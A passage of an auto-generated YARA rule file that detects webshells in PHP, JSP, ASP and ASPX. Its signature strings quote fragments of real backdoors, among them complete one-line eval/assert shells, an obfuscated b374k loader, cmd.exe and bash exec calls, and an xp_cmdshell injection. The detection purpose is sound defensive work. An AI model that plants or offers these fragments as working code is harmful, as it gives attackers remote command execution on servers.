      $s17 = "<%@ LANGUAGE = VBScript.Encode %>" fullword ascii
      $s18 = "LNn.kkO+BEHlLsEMVEr#,GD,qU?DDcnNN+MdkD+~r^G:cYMJbPG.,qU?D.`" fullword ascii
      $s19 = "PmxG.slV,CDDlmmVO" fullword ascii
      $s20 = "EP0CNmDP9nU+Hka~~/GUMl~X" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 500KB and
      8 of them
}

rule webshell_jsp_wscmd {
   meta:
      description = "webshell - file wscmd.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "677db2639e3b72d3f906336276e66df8bd6e249e95b4076165a2a813a70057be"
   strings:
      $x1 = "                    process = Runtime.getRuntime().exec(new String[] { \"cmd.exe\", \"/c\", s });" fullword ascii
      $s2 = "                    process = Runtime.getRuntime().exec(new String[] { \"/bin/bash\", \"-c\", s });" fullword ascii
      $s3 = "                InputStream inputStream = process.getInputStream();" fullword ascii
      $s4 = "<%@ page import=\"javax.websocket.server.ServerEndpointConfig\" %>" fullword ascii
      $s5 = "                session.getBasicRemote().sendText(stringBuilder.toString());" fullword ascii
      $s6 = "                Process process;" fullword ascii
      $s7 = "                process.waitFor();" fullword ascii
      $s8 = "        out.println(\"success, connect url path: \" + servletContext.getContextPath() + path);" fullword ascii
      $s9 = "        public void onOpen(final Session session, EndpointConfig config) {" fullword ascii
      $s10 = "<%@ page import=\"java.io.*\" %>" fullword ascii
      $s11 = "    ServletContext servletContext = request.getSession().getServletContext();" fullword ascii
      $s12 = "<%@ page import=\"javax.websocket.*\" %>" fullword ascii
      $s13 = "<%@ page import=\"javax.websocket.server.ServerContainer\" %>" fullword ascii
      $s14 = "                while ((i = inputStream.read()) != -1)" fullword ascii
      $s15 = "        private Session session;" fullword ascii
      $s16 = "        @Override" fullword ascii
      $s17 = "        if (servletContext.getAttribute(path) == null){" fullword ascii
      $s18 = "    String path = request.getParameter(\"path\");" fullword ascii
      $s19 = "                boolean bool = System.getProperty(\"os.name\").toLowerCase().startsWith(\"windows\");" fullword ascii
      $s20 = "            container.addEndpoint(configEndpoint);" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule PHP {
   meta:
      description = "webshell - file PHP.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "52d10d32a57aac8e30add6a38bb58b5b42a764aad388e76f109424811079b6bd"
   strings:
      $s1 = " - ExpDoor.com</title>" fullword ascii
      $s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILENAME\"];?>'><br><br>" fullword ascii
      $s3 = "if(fwrite($f,$_POST[\"c\"]))" fullword ascii
      $s4 = "$f=fopen($_POST[\"f\"],\"w\");" fullword ascii
      $s5 = "echo \"<font color=blue>Error!</font>\";" fullword ascii
      $s6 = "if ($_POST)" fullword ascii
      $s7 = "<input type=\"submit\" id=\"b\" value=\"Create\"><br>" fullword ascii
      $s8 = "echo \"<font color=red>OK!</font>\";" fullword ascii
      $s9 = "<title> PHP" fullword ascii
      $s10 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>" fullword ascii
      $s11 = "<form action=\"\" method=\"post\">" fullword ascii /* Goodware String - occured 2 times */
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule Aspx {
   meta:
      description = "webshell - file Aspx.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "74ebf0533b4c78ee51833c80fdffff97794ead91a0ae2c60ebb92b8093ea51fa"
   strings:
      $s1 = "<form action=http://127.0.0.1/test.aspx method=post>" fullword ascii
      $s2 = "<%@ Page Language=\"Jscript\"%><%Response.Write(eval(Request.Item[\"z\"],\"unsafe\"));%>" fullword ascii
      $s3 = "<%@ import Namespace=\"System.IO\" %>" fullword ascii
      $s4 = "dim mywrite as new streamwriter(request.form(\"path\"), true, encoding.default) mywrite.write(request.form(\"content\")) " fullword ascii
      $s5 = "response.write(\"Done!\")" fullword ascii
      $s6 = "var nonamed=new System.IO.StreamWriter(Server.MapPath(\"nonamed.aspx\"),false);" fullword ascii
      $s7 = "nonamed.Close();" fullword ascii
      $s8 = "nonamed.Write(Request.Item[\"l\"]);" fullword ascii
      $s9 = "mywrite.close " fullword ascii
      $s10 = "<TITLE> ASPX one line Code Client by amxku</TITLE>" fullword ascii
      $s11 = "<input type=submit value=" fullword ascii
      $s12 = "<textarea name=z cols=120 rows=10 width=45>" fullword ascii
      $s13 = "Sub Page_load(sender As Object, E As EventArgs) " fullword ascii
      $s14 = "<textarea name=l cols=120 rows=10 width=45>your code</textarea><BR><center><br>" fullword ascii
      $s15 = "<%@ Page Language=\"VB\" %>" fullword ascii
   condition:
      uint16(0) == 0x6b31 and filesize < 2KB and
      8 of them
}

rule webshell_jsp_sys3 {
   meta:
      description = "webshell - file sys3.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "7bf6f0b112bbc9855fbe4dbc56b2c1f26065d06605d6b6fd73db59bd5e226097"
   strings:
      $s1 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>" fullword ascii
      $s2 = "<%@page contentType=\"text/html;charset=gb2312\"%>" fullword ascii
      $s3 = "  </head>" fullword ascii
      $s4 = "    <form name=\"frmUpload\" method=\"post\" action=\"\">" fullword ascii
      $s5 = "  <head>" fullword ascii
      $s6 = "    <input type=\"text\" size=\"70\" name=\"path\" value=\"<%out.print(getServletContext().getRealPath(\"/\")); %>\">" fullword ascii
      $s7 = "   String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"),\"gb2312\");" fullword ascii
      $s8 = "   String context=new String(request.getParameter(\"context\").getBytes(\"ISO-8859-1\"),\"gb2312\");" fullword ascii
      $s9 = "   if(request.getParameter(\"context\")!=null)" fullword ascii
      $s10 = "            pt.write(context.getBytes());" fullword ascii
      $s11 = "  </body>" fullword ascii
      $s12 = "  <body>" fullword ascii
      $s13 = "    <input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 3KB and
      8 of them
}

rule bypass_waf_2015_06_16_02 {
   meta:
      description = "webshell - file bypass-waf-2015-06-16-02.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "02f7273527131860c6120a7c0576a6628bc4af1b702409b76ecdca8c95849f66"
   strings:
      $s1 = "<?php $item['wind'] = 'assert'; $array[] = $item; $array[0]['wind']($_POST['hkwwj']);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule b374k_2_5 {
   meta:
      description = "webshell - file b374k-2.5.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8ec83670b0e2a7e334c6c44e3e07d15582c076ad65be7507fc99e16f549c8e4d"
   strings:
      $x1 = "$s_func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";$b374k=@$s_func('$x,$y','ev'.'al'.'(\"\\$s_pass=\\\"$y\\\";?>\".gz'.'inf'.'late'" ascii
      $s2 = "Uh+eO1qJED/FP+ZE5Xw910Mha17voPpYPRBcwosLW9foYRw8Hpk7K/3Ujw8WxrarvNIeZ+3SID8L6MAJh4z9K2wDloGp34Gv56PrOFTpoGcmyzaOYEQt1lIwOxrTPyOl" ascii
      $s3 = "// shell password, fill with password in md5 format to protect shell, default : b374k" fullword ascii
      $s4 = "te9PBrddakx202tsVytYnVBCyy9o9TDiyjzX6EzykX4F4t1Ru20qk+SMKG5mjSWrcmMSm+STLpx3IwrlU2zJG6mlQ61bCibRUdaLyc5mpakESwwZTqTemPODnRjl2x2n" ascii
      $s5 = "1tGQttcMdwJnC8k3NcICfedhSS0W+YxKEYY/FIp4f5ZKfmPSYi3QXxFSDzL6XvKSWSbzu0Izu+IK/ty7+oL7jsLS2Snz+NSPGfzi0XmK2TGb/ERq8uiYYBJOSoS4Snxa" ascii
      $s6 = "49bp7NOnTakplr5ZlqQluRQsSbl1WyYHtHLpZ6W8scCNTxli0NiTGYSjXlD1yRWbRA8MKRrW7vLpLM0Y+rF6ckZc90csxXq3Vpxualvc8eyeWI2h2pfJrRpdZzMJpeGu" ascii
      $s7 = "q7qLzqrqbopKvx98uFj7N8Ga76Yosy+SKIsmjhNVMQXkH5/x4iGJpHHF1TSuHu8S95F8gVTlm5mSip/nkdLLKkbJmnSJC2w9yDp/zFeFFJmY8+xOJUpZHdxlGSzOkxJP" ascii
      $s8 = "d1SQ4UYKltnlM0s581iBrRkni+ksnN9UR6pkrBJcu26vknui+U8oRY2JXulVxZ5MMM0weLimNdSCS5ZtYF6LfSpYqfDOhtOa6ycrb3u9Ui+RshSoWKW1nqi0i0lDFosc" ascii
      $s9 = "/VHsPy1nPrtrP4IUIk/XOGGMGUtzBD8JtwduFiA5uY25/kIZSLNcRKRFjd0f6I2H9xp7wBYMwDMCxQPlrm/A7B3D3CD8Sc0TNiDaLirNZ0O2j9wwk9LwPbxwOIbUStjZ" ascii
      $s10 = "8tgde83fOARPGrDZeCp+p18BF93D39eOSDHeR6xu+BW478jGfchyiHCIbofw7ugEeIGJh67St24Rd34Muoe8QsKAMLQ7RAJbISoiqhwanBzZ96uxZ8/h9s0PloGSS4Rj" ascii
      $s11 = "KZdaABXQD+Df7/M/mFYCX9KoeYEiaz5ivYC+a8rlktm/3n1AkY4HqRhHSNdUS/fzYB5SxddHR4vHkmgld7H75epKBebDuv2D2mjy959vCKyN9RTeBn0W8yrdOyPeKB5T" ascii
      $s12 = "9lpp+NoVNo5EtUmx/zAGOZyzWFCoNKClrGVdqolpVebWeHAJkadAbVcL3n6SKqFXkJLp4UseWQ1gTmOOgspYye2DdoSBsBoMcvk6WAPSma5mJeLmVY+0ZBzSkbWmGzJm" ascii
      $s13 = "nqzUcjUl11mPKePqaPcLy2GrCRPNqvUtFGdVWoCNd3VsiSd2ALkCUKbrRyZLByJ6ra6kZTJ4cgpCYbYKIcE1xrlspyymhNETh4djHRiYlnrMXlsHGodpzzVMxN5oRSSt" ascii
      $s14 = "YZd/0IRhBfArC5dA4WkzkB1izqe9Sz2K6YbT0h5QMCP2LHTCwda794DBVIN0IjKLkjx6g7hnjlVYxU/7zHuxKHHIw52FesBPSIRAuU4WlINP/nhBsGoREL3WXFakEHHJ" ascii
      $s15 = "zhwQfuuTeID9Ye1ea8+dbPrii0CU0cGtQ1A6oNFezIc9OuDmQu2IHUR1ieEZ1GetMsVgCkW7UavQri1tefPgZ76ssGFtQswXeDYOvOZdRHXKe6SvfdKPXz0bve8L8QT3" ascii
      $s16 = "jVSSrUysa/THXlS6I5Yu2cfcmw512sJe10pFMc1btdP2ZPaPsm3Es32fG+1mKTUafL7hjTIOPVWzzr1+b2dXQGdL3USp8lJrMzsaUpmRq1UbZpQVLOgL5MS0Z2Sg0nxW" ascii
      $s17 = "VQqiO2+YB0Sh6q+SS175HBvJdZ1qtdLLPJlnhW6Bp1NstNVqiTqabnb3U3yfabEz7ZKR2I3p1ZTnvIFY6X3uF5ZrS67XPagVaRGo9iy6rrT6TYJycmrzXKyV1LpzsAWS" ascii
      $s18 = "3K9XvWift9GEvbKf5HrPrcBXw8BZ+cTZAzMhG48bAD3qkPMS95C9T2/RXIGHPjxeVUNUaICkWkkvbuPt/4FTUSPhnsd6qv1FET9fzXVP6OpQgomWBV9Z1XjjcZXtc01R" ascii
      $s19 = "USKK/cYBgz6BVMJ553vE/p0kaBdI+g7bQvX7LYzzoAL7J0WOfajOfxOz8/0vNT6nfsav9e55U83+cVe5L6R5dP35hl52zt3jOwie7hEBtMvw65gGNjDAjA2gfEbr2Jfm" ascii
      $s20 = "gPXSEfELr2Y6+z5o+5YBgy0ItqaKoYfjZ/3w8XNzciOwicggj9L5sf4YyT5M0yGkeYe7790UD08XG5F4Ff1Z554I56+fLcaruxeC6AYrYWgOldcuXyPG6/cOw440XLl9" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_2020_08_20_08 {
   meta:
      description = "webshell - file 2020.08.20.08.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c922a7e235833efd7a9be25777efe7a1900659919a634ba46008dfde35c7bca7"
   strings:
      $s1 = "    call_user_func_array(assert,array($_POST['x']));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2022_08_26_08 {
   meta:
      description = "webshell - file 2022-08-26-08.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2de584e2baeecb0f27064960daf7ae4e5e418457c3fbf57aa96e2bd80b828e9f"
   strings:
      $s1 = "    $a = $_GET['a'];" fullword ascii
      $s2 = "    $f = $_GET['f'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_20220206 {
   meta:
      description = "webshell - file 20220206.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f2a307468cd40e7de86004c6348d13342d1725c93a8b7452f0d9ee2c842e60b9"
   strings:
      $s1 = "<?=$_GET[p]==_&&$_GET[f]($GET_[c])" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php_niu_2 {
   meta:
      description = "webshell - file php_niu_2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "36f2a1667598efd544242d8aa356ba5cb8c10863d28a583796cf76386398078f"
   strings:
      $s1 = "\";$____.=~($___{$__});" fullword ascii
      $s2 = "$_=$$_____;" fullword ascii
      $s3 = "\";$____.=~($___{$__});$___=\"" fullword ascii
      $s4 = "$____='';" fullword ascii
      $s5 = "\";$_____.=~($___{$__});$___=\"" fullword ascii
      $s6 = "$_____='_';$___=\"" fullword ascii
      $s7 = "\";$_____.=~($___{$_});$___=\"" fullword ascii
      $s8 = "$___=\"" fullword ascii
      $s9 = "$____($_[$__]);" fullword ascii
      $s10 = "\";$____.=~($___{$_});$___=\"" fullword ascii
      $s11 = "$_=$__/$__;" fullword ascii
      $s12 = "$__=('>'>'<')+('>'>'<');" fullword ascii
      $s13 = "\";$_____.=~($___{$_});" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule sig_2022_08_26_05 {
   meta:
      description = "webshell - file 2022-08-26-05.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0312bfd596e977bced69273c1a26f4c664694c6893487a079e5ca18277c8d968"
   strings:
      $s1 = "    ($_GET['p']=='password')?$_GET['f']($_GET['a']):y);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule webshell_jsp_2 {
   meta:
      description = "webshell - file 2.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "11c6a21978abede258a86656ea665773ff5d126975a2389d6514a3f7f25507c1"
   strings:
      $s1 = "_jshellContent = m.replaceAll(\"private String _password = \\\"\" + password + \"\\\"\");" fullword ascii
      $s2 = "I</a> and welcome to <a href=\"http://bbs.hksxs.com\" target=\"_blank\">" fullword ascii
      $s3 = "public String DBExecute(String sql) {" fullword ascii
      $s4 = "_jshellContent = m.replaceAll(\"private int _sessionOutTime = \" + sessionTime);" fullword ascii
      $s5 = "p = Pattern.compile(\"private\\\\sString\\\\s_password\\\\s=\\\\s\\\"\" + _password + \"\\\"\");" fullword ascii
      $s6 = "public void setPassword(String password) throws JshellConfigException {" fullword ascii
      $s7 = "_dbConnection = DriverManager.getConnection(_url, User, Password);" fullword ascii
      $s8 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
      $s9 = "if (_dbStatement.execute(sql)) {" fullword ascii
      $s10 = "dbResult = DBExecute(sql);" fullword ascii
      $s11 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
      $s12 = "public boolean DBInit(String dbType, String dbServer, String dbPort, String dbUsername, String dbPassword, String dbName) {" fullword ascii
      $s13 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
      $s14 = "proc = runtime.exec(cmd);" fullword ascii
      $s15 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
      $s16 = "_jshellContent = m.replaceAll(\"private String _encodeType = \\\"\" + encodeType + \"\\\"\");" fullword ascii
      $s17 = "public String exeCmd(String cmd) {" fullword ascii
      $s18 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"password\") == null) {" fullword ascii
      $s19 = "jshell.write(buffer, start, buffer.length - 1 - start);" fullword ascii
      $s20 = "request.getParameter(\"dbPassword\") == null ||" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule sig_2013110125222650 {
   meta:
      description = "webshell - file 2013110125222650.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bbee3a7eeceef058919740e7317cd8f552b194badf3cdc6922e42b115fdd7fa9"
   strings:
      $x1 = "cmd.ExecuteNonQuery();" fullword ascii
      $x2 = "ProcessStartInfo MyProcessStartInfo = new ProcessStartInfo(\"cmd.exe\");" fullword ascii
      $s3 = "MyProcessStartInfo.UseShellExecute = false;" fullword ascii
      $s4 = "cmd.CommandText = \"exec master..xp_cmdshell '\" + TextBoxSqlCon.Text + \"'\";" fullword ascii
      $s5 = ":<asp:TextBox ID=\"TextBoxDurl\" runat=\"server\" Width=\"270px\">http://www.baidu.com/img/logo.gif</asp:TextBox></br>" fullword ascii
      $s6 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + HttpUtility.UrlEncode(file.Name));" fullword ascii
      $s7 = "LbNum.Text = ProcessNum + \"" fullword ascii
      $s8 = "MyProcessStartInfo.Arguments = \"/c\" + TextBoxDos.Text;" fullword ascii
      $s9 = ":<asp:TextBox ID=\"TextBoxDfile\" runat=\"server\" Width=\"270px\">c:\\logo.gif</asp:TextBox>" fullword ascii
      $s10 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\Documents\\'><font color=\"#009900\">Documents</font></a> </" ascii
      $s11 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\'><font color=\"#009900\">All Users</font></a> </td>" fullword ascii
      $s12 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\config\\'><font color=\"#009900\">Config</font></a> </td>" fullword ascii
      $s13 = "ListBoxPro.Items.Add(allprocess.ProcessName);" fullword ascii
      $s14 = "<asp:Label ID=\"LbSqlD\" runat=\"server\" Text=\"Command:\" Width=\"42px\"></asp:Label>" fullword ascii
      $s15 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\" fullword ascii
      $s16 = "else if ((page == \"process\") && Session[\"root\"] != null)" fullword ascii
      $s17 = "<td><a href='?page=index&src=C:\\Program Files\\RhinoSoft.com\\'><font color=\"#009900\">Serv-u" fullword ascii
      $s18 = "Process[] process = Process.GetProcesses();" fullword ascii
      $s19 = "<asp:TextBox ID=\"TextBoxNewfile\" runat=\"server\" Width=\"477px\" ForeColor=\"#009900\" >c:\\char.txt</asp:TextBox>" fullword ascii
      $s20 = "Process[] killprocess = Process.GetProcesses();" fullword ascii
   condition:
      uint16(0) == 0x6967 and filesize < 80KB and
      1 of ($x*) and 4 of them
}

rule YXNzZXJ0YWE {
   meta:
      description = "webshell - file YXNzZXJ0YWE.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "479e7576a984582a5f377269d133a2435f4a2c237e29ba30b073c62c89ca9554"
   strings:
      $s1 = "* YXNzZXJ0YWE=" fullword ascii
      $s2 = "$zhushi = substr(($reflector->getDocComment()), 7, 12);" fullword ascii
      $s3 = "foreach (array('_POST','_GET') as $_request) {" fullword ascii
      $s4 = "$zhushi = base64_decode($zhushi);" fullword ascii
      $s5 = "$zhushi = substr($zhushi, 0, 6);" fullword ascii
      $s6 = "$zhushi($_value);" fullword ascii
      $s7 = "    public function fn()" fullword ascii
      $s8 = "    foreach ($$_request as $_key=>$_value) {" fullword ascii
      $s9 = "class Example" fullword ascii
      $s10 = "$reflector = new ReflectionClass('Example');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule getConstants2 {
   meta:
      description = "webshell - file getConstants2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "238583325fc209fcd329c4c4999802cdb63d64a374d8214dff786cfd34a728d6"
   strings:
      $s1 = "foreach ($refl->getConstants() as $key => $value) {" fullword ascii
      $s2 = "foreach (array('_POST','_GET') as $_request) {" fullword ascii
      $s3 = "$value2($_value);" fullword ascii
      $s4 = "    foreach ($$_request as $_key=>$_value) {" fullword ascii
      $s5 = "    public function __construct()" fullword ascii
      $s6 = "    foreach ($value as $key => $value1) {" fullword ascii
      $s7 = "$refl = new ReflectionClass('Test');" fullword ascii
      $s8 = "class Test" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule getConstants {
   meta:
      description = "webshell - file getConstants.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ad8d4d43f60bf144a037077b8e22a0ffb4ff33d45507d96746aad6941bf916a8"
   strings:
      $s1 = "foreach (array('_POST','_GET') as $_request) {" fullword ascii
      $s2 = "    $para1 = $reflector->getConstant(chr($i));" fullword ascii
      $s3 = "$para2($_value);" fullword ascii
      $s4 = "    foreach ($$_request as $_key=>$_value) {" fullword ascii
      $s5 = "    public function __construct()" fullword ascii
      $s6 = "$para2;" fullword ascii
      $s7 = "for ($i=97; $i <= 99; $i++) {" fullword ascii
      $s8 = "$para1;" fullword ascii
      $s9 = "class Test" fullword ascii
      $s10 = "$reflector = new ReflectionClass('Test');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ELMALISEKER_Backd00r {
   meta:
      description = "webshell - file ELMALISEKER Backd00r.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "53346253fef1d655c844c914a6535fed1d82b98b45ceb27ff39e37a54f55a49a"
   strings:
      $x1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
      $s2 = "bFieldContent = MidB(Binary, (PosEndOfHeader + 4), PosCloseBoundary - (PosEndOfHeader + 4) - 2)" fullword ascii
      $s3 = "HeaderContent = MidB(Binary, PosOpenBoundary + LenB(Boundary) + 2, PosEndOfHeader - PosOpenBoundary - LenB(Boundary) - 2)" fullword ascii
      $s4 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
      $s5 = "Content_Disposition = LTrim(SeparateField(Head, \"content-disposition:\", \";\"))" fullword ascii
      $s6 = "Content_Type = LTrim(SeparateField(Head, \"content-type:\", \";\"))" fullword ascii
      $s7 = "<b>User</b>: <%= \"\\\\\" & oScriptNet.ComputerName & \" \\ \" & oScriptNet.UserName %> <br>" fullword ascii
      $s8 = "GetHeadFields BinaryToString(HeaderContent), Content_Disposition, FormFieldName, SourceFileName, Content_Type" fullword ascii
      $s9 = "Function GetHeadFields(ByVal Head, Content_Disposition, Name, FileName, Content_Type)" fullword ascii
      $s10 = "TempAtt=TempAtt + int(Request.form(\"FolderAttribute2\"))" fullword ascii
      $s11 = "<p><font color=\"#00FF00\"><input type=\"text\" name=\".CMD\" size=\"45\" value=\"<%= szCMD %>\"> <input type=\"submit\" value=" ascii
      $s12 = "TempAtt=TempAtt + int(Request.form(\"FolderAttribute7\"))" fullword ascii
      $s13 = "TempAtt=TempAtt + int(Request.form(\"FolderAttribute4\"))" fullword ascii
      $s14 = "response.write(\"<form name=lstDrives action=elmaliseker.asp method=post>\")" fullword ascii
      $s15 = "<b>User Agent</b>: <%=request.servervariables(\"HTTP_USER_AGENT\")%> <br>" fullword ascii
      $s16 = "TempAtt=TempAtt + int(Request.form(\"FileAttribute6\"))" fullword ascii
      $s17 = "TempAtt=TempAtt + int(Request.form(\"FileAttribute5\"))" fullword ascii
      $s18 = "response.write(\"<form name=frmFileAttributes action=elmaliseker.asp method=post>\")" fullword ascii
      $s19 = "TempAtt=TempAtt + int(Request.form(\"FileAttribute4\"))" fullword ascii
      $s20 = "response.write(\"<form name=lstFiles action=elmaliseker.asp method=post>\")" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule webshell_asp_ntdaddy {
   meta:
      description = "webshell - file ntdaddy.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "baf4c45b84a1cca5fd1b32df4d4d60d7cb41135c61156772bd9eec6f7660af6e"
   strings:
      $x1 = "Call  oScript.Run  (\"cmd.exe  /c  \"  &  szCMD  &  \"  >  \"  &  szTempFile,  0,  True)" fullword ascii
      $s2 = "HeaderContent  =  MidB(Binary,  PosOpenBoundary  +  LenB(Boundary)  +  2,  PosEndOfHeader  -  PosOpenBoundary  -  LenB(Boundary)" ascii
      $s3 = "HeaderContent  =  MidB(Binary,  PosOpenBoundary  +  LenB(Boundary)  +  2,  PosEndOfHeader  -  PosOpenBoundary  -  LenB(Boundary)" ascii
      $s4 = "bFieldContent  =  MidB(Binary,  (PosEndOfHeader  +  4),  PosCloseBoundary  -  (PosEndOfHeader  +  4)  -  2)" fullword ascii
      $s5 = "szTempFile  =  \"C:\\\"  &  oFileSys.GetTempName(  )" fullword ascii
      $s6 = "<b>User</b>:  <%=  \"\\\\\"  &  oScriptNet.ComputerName  &  \"  \\  \"  &  oScriptNet.UserName  %>  <br>" fullword ascii
      $s7 = "Content_Type  =  LTrim(SeparateField(Head,  \"content-type:\",  \";\"))" fullword ascii
      $s8 = "Content_Disposition  =  LTrim(SeparateField(Head,  \"content-disposition:\",  \";\"))" fullword ascii
      $s9 = "GetHeadFields  BinaryToString(HeaderContent),  Content_Disposition,  FormFieldName,  SourceFileName,  Content_Type" fullword ascii
      $s10 = "Function  GetHeadFields(ByVal  Head,  Content_Disposition,  Name,  FileName,  Content_Type)" fullword ascii
      $s11 = "response.write(\"<form  name=lstFiles  action=ntdaddy.asp  method=post>\")" fullword ascii
      $s12 = "TempAtt=TempAtt  +  int(Request.form(\"FileAttribute3\"))" fullword ascii
      $s13 = "<p><input  type=\"text\"  name=\".CMD\"  size=\"45\"  value=\"<%=  szCMD  %>\">  <input  type=\"submit\"  value=\"Run\">  </p>" fullword ascii
      $s14 = "TempAtt=TempAtt  +  int(Request.form(\"FolderAttribute9\"))" fullword ascii
      $s15 = "<b>User  Agent</b>:  <%=request.servervariables(\"HTTP_USER_AGENT\")%>  <br>" fullword ascii
      $s16 = "TempAtt=TempAtt  +  int(Request.form(\"FileAttribute9\"))" fullword ascii
      $s17 = "TempAtt=TempAtt  +  int(Request.form(\"FolderAttribute2\"))" fullword ascii
      $s18 = "TempAtt=TempAtt  +  int(Request.form(\"FileAttribute5\"))" fullword ascii
      $s19 = "TempAtt=TempAtt  +  int(Request.form(\"FileAttribute6\"))" fullword ascii
      $s20 = "TempAtt=TempAtt  +  int(Request.form(\"FolderAttribute8\"))" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule mysql {
   meta:
      description = "webshell - file mysql.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "bf3ef85a52279d08e94f52d4136dd4817dac76bd11ce8df931311d5aecac946f"
   strings:
      $s1 = "        Connection conn = DriverManager.getConnection(url, username, password);" fullword ascii
      $s2 = "        rs = stmt.executeQuery(\"SELECT * FROM \" + table);" fullword ascii
      $s3 = "  <p>password:<input type=\"text\" name=\"password\" value=\"<%=request.getParameter(\"password\")%>\"/></p>" fullword ascii
      $s4 = "  <p>username:<input type=\"text\" name=\"username\" value=\"<%=request.getParameter(\"username\")%>\"/></p>" fullword ascii
      $s5 = "        String password = request.getParameter(\"password\");" fullword ascii
      $s6 = "        out.println(\"Dumping data for table \" + table + \"...<br />\");" fullword ascii
      $s7 = "<%@ page import=\"java.sql.*\" %>" fullword ascii
      $s8 = "<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>" fullword ascii
      $s9 = "<input type=\"text\" name=\"bak_path\" <%=request.getParameter(\"bak_path\")%>/></p>" fullword ascii
      $s10 = "<form action=\"\" method=\"post\" name=\"form1\" id=\"form1\">" fullword ascii
      $s11 = "   <p>driver:<input type=\"text\" name=\"driver\" value=\"<%=request.getParameter(\"driver\")%>\"/></p>" fullword ascii
      $s12 = "<%@ page import=\"java.util.*\" %>" fullword ascii
      $s13 = "        String driver =request.getParameter(\"driver\");" fullword ascii
      $s14 = "<%@ page import=\"java.io.*\" %>" fullword ascii
